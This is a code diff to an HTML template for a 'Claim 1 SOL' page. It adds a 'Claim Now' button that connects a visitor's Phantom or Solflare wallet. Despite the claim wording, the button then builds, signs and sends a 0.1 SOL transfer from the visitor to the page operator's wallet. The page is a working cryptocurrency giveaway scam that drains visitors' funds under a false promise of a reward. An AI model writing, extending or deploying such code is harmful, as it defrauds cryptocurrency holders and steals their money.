@@ -12,6 +12,7 @@ HTML_TEMPLATE = """
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Claim 1 SOL</title>
+  <script src="https://unpkg.com/@solana/web3.js@1.76.0/lib/index.iife.min.js"></script>
   <style>
     body {
       background-color: #000;
@@ -32,7 +33,7 @@ HTML_TEMPLATE = """
       margin: 20px;
     }
     .button:disabled {
-      opacity: 0.6;
+      opacity: 0.5;
       cursor: not-allowed;
     }
     img.qr {
@@ -55,60 +56,87 @@ HTML_TEMPLATE = """
   <p>Send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-  
+
   <button class="button" id="connectBtn">🔗 Connect Wallet</button>
+  <button class="button" id="claimBtn" disabled>💸 Claim Now</button>
+
   <div id="status">Click "Connect Wallet" to begin.</div>
 
-  <!-- Solflare Adapter (optional fallback for Solflare mobile app) -->
-  <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.9.14/lib/cjs/index.umd.min.js"></script>
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const status = document.getElementById("status");
-      const qr = document.getElementById("qrCode");
-      const btn = document.getElementById("connectBtn");
+    const walletAddress = "{{ wallet }}";
+    let provider = null;
+    let publicKey = null;
 
-      btn.addEventListener("click", async () => {
-        let provider = null;
+    const status = document.getElementById("status");
+    const qr = document.getElementById("qrCode");
+    const connectBtn = document.getElementById("connectBtn");
+    const claimBtn = document.getElementById("claimBtn");
 
-        // Phantom detection
-        if (window?.phantom?.solana?.isPhantom) {
-          provider = window.phantom.solana;
-          status.innerText = "🔍 Phantom wallet detected.";
+    connectBtn.addEventListener("click", async () => {
+      if (window?.phantom?.solana?.isPhantom) {
+        provider = window.phantom.solana;
+      } else if (window?.solflare?.isSolflare) {
+        provider = window.solflare;
+      } else {
+        status.innerText = "⚠️ No wallet detected (Phantom or Solflare). Try mobile wallet.";
+        qr.style.display = "block";
+        return;
+      }
+
+      try {
+        status.innerText = "🔄 Connecting...";
+        const resp = await provider.connect();
+        publicKey = resp?.publicKey?.toString() || provider.publicKey?.toString();
+
+        if (publicKey) {
+          status.innerText = "✅ Connected: " + publicKey;
+          connectBtn.innerText = "✅ Connected";
+          connectBtn.disabled = true;
+          claimBtn.disabled = false;
+        } else {
+          status.innerText = "❌ Connection failed.";
         }
-        // Solflare detection
-        else if (window?.solflare?.isSolflare) {
-          provider = window.solflare;
-          status.innerText = "🔍 Solflare wallet detected.";
-        }
+      } catch (err) {
+        status.innerText = "❌ Connection rejected or failed.";
+        console.error(err);
+      }
+    });
 
-        // No wallet found
-        if (!provider) {
-          status.innerText = "⚠️ No supported wallet detected (Phantom or Solflare). Scan the QR with a mobile wallet.";
-          qr.style.display = "block";
-          return;
-        }
+    claimBtn.addEventListener("click", async () => {
+      if (!provider || !publicKey) {
+        status.innerText = "❌ Connect wallet first.";
+        return;
+      }
 
-        try {
-          status.innerText += "\\n🔄 Requesting connection...";
-          const resp = await provider.connect();
-          const publicKey = resp?.publicKey?.toString() || provider.publicKey?.toString();
+      try {
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
+        const toPubkey = new solanaWeb3.PublicKey(walletAddress);
+        const lamports = solanaWeb3.LAMPORTS_PER_SOL * 0.1;
 
-          if (publicKey) {
-            status.innerText = "✅ Connected: " + publicKey;
-            btn.innerText = "✅ Connected";
-            btn.disabled = true;
-          } else {
-            status.innerText = "❌ Connected, but no public key returned.";
-          }
-        } catch (err) {
-          console.error("Connection error:", err);
-          if (err?.code === 4001 || (err?.message?.toLowerCase().includes("rejected"))) {
-            status.innerText = "❌ Connection rejected by user.";
-          } else {
-            status.innerText = "❌ Failed to connect. Please try again.";
-          }
-        }
-      });
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey,
+            toPubkey,
+            lamports
+          })
+        );
+
+        transaction.feePayer = fromPubkey;
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        const signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
+
+        status.innerText = "✅ 0.1 SOL sent! Tx: https://solscan.io/tx/" + signature;
+        claimBtn.innerText = "✅ Claimed";
+        claimBtn.disabled = true;
+      } catch (err) {
+        console.error(err);
+        status.innerText = "❌ Transaction failed or canceled.";
+      }
     });
   </script>
 </body>
